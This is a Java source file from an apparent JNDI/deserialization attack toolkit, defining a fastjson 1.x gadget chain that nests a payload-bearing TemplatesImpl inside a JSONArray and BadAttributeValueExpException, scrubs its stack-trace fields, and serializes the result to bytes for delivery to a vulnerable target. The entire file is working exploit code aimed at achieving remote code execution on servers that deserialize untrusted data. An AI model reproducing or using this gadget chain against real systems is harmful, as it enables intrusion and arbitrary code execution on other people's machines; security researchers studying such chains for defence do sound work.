package sonomon.jndi.deser.gadgets;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.util.HashMap;

import javax.management.BadAttributeValueExpException;
import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

public class Fastjson_BadAttribute_Templates implements SerializeObject{
	//fastjson1
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
		
		//jdk > 1.7
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(tempImpl);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Deserialize.setFieldValue(val,"val",jsonArray);
        // 删除堆栈信息
        Deserialize.setFieldValue(val, "stackTrace", new StackTraceElement[0]);
        Deserialize.setFieldValue(val, "cause", null);
        Deserialize.setFieldValue(val, "suppressedExceptions", null);
        
        
        HashMap hashMap = new HashMap();
        hashMap.put(tempImpl,val);
        
        return hashMap;
    }
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
}